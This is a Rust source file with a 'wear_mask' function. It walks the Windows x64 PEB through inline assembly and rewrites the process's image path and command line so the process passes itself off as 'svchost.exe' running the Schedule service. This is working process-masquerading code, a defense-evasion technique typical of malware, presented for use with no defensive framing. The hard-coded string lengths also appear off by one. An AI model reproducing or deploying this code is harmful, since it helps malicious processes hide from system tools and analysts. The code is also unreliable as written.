#![allow(non_snake_case)]
use std::ffi::c_void;

// Minimal definitions to walk PEB
// We rely on offsets or windows crate if available.
// Windows crate has partial PEB support but usually hidden behind features or unsafe.
// We'll use a direct approach if possible, or offsets.
// On x64: PEB is at GS:[0x60].

#[repr(C)]
struct UNICODE_STRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

#[repr(C)]
struct PEB {
    InheritedAddressSpace: u8,
    ReadImageFileExecOptions: u8,
    BeingDebugged: u8, // We could verify this too!
    BitField: u8,
    Padding0: [u8; 4],
    Mutant: *mut c_void,
    ImageBaseAddress: *mut c_void,
    Ldr: *mut c_void,
    ProcessParameters: *mut RTL_USER_PROCESS_PARAMETERS,
    // ... rest ignored
}

#[repr(C)]
struct RTL_USER_PROCESS_PARAMETERS {
    MaximumLength: u32,
    Length: u32,
    Flags: u32,
    DebugFlags: u32,
    ConsoleHandle: *mut c_void,
    ConsoleFlags: u32,
    StandardInput: *mut c_void,
    StandardOutput: *mut c_void,
    StandardError: *mut c_void,
    CurrentDirectory: [u8; 24], // CURDIR struct
    DllPath: UNICODE_STRING,
    ImagePathName: UNICODE_STRING, // <--- TARGET
    CommandLine: UNICODE_STRING,   // <--- TARGET
}

/// Modifies the PEB to look like 'svchost.exe' to some tools.
/// This doesn't change `GetModuleFileName` result (which queries kernel),
/// but it changes the user-mode perception in memory dumps and some tools.
#[cfg(target_arch = "x86_64")]
pub fn wear_mask() {
    unsafe {
        // 1. Get PEB ptr
        // Use intrinsic: __readgsqword(0x60)
        // Rust inline asm?
        let peb: *mut PEB;
        std::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb
        );
        
        if peb.is_null() { return; }
        
        // 2. Modify ImagePathName
        let params = (*peb).ProcessParameters;
        if params.is_null() { return; }
        
        // We overwrite the buffer contents.
        // Needs to be wide string.
        let fake_path: Vec<u16> = "C:\\Windows\\System32\\svchost.exe".encode_utf16().chain(std::iter::once(0)).collect();
        let fake_cmd: Vec<u16> = "svchost.exe -k netsvcs -p -s Schedule".encode_utf16().chain(std::iter::once(0)).collect();

        // Safety: We are writing to our own process memory.
        // Length check?
        // We technically shouldn't write *past* the buffer if the original string was shorter.
        // svchost path is reasonably long.
        // If our original path is strictly shorter, we might corrupt heap.
        // Safer: Just update the pointer?
        // Updating pointer to leaked memory or static memory is safer.
        // BUT: if accessors try to free it? ProcessParameters usually lives for process lifetime.
        
        // Let's alloc new buffers (leak them) and point to them.
        let new_path_ptr = Box::into_raw(fake_path.into_boxed_slice()) as *mut u16;
        let new_cmd_ptr = Box::into_raw(fake_cmd.into_boxed_slice()) as *mut u16;
        
        (*params).ImagePathName.Buffer = new_path_ptr;
        (*params).ImagePathName.Length = (32 * 2) as u16; // 32 chars * 2 bytes
        (*params).ImagePathName.MaximumLength = (33 * 2) as u16;

        (*params).CommandLine.Buffer = new_cmd_ptr;
        (*params).CommandLine.Length = (38 * 2) as u16;
        (*params).CommandLine.MaximumLength = (39 * 2) as u16;
    }
}

#[cfg(not(target_arch = "x86_64"))]
pub fn wear_mask() {
    // No-op for x86 (different offset)
}
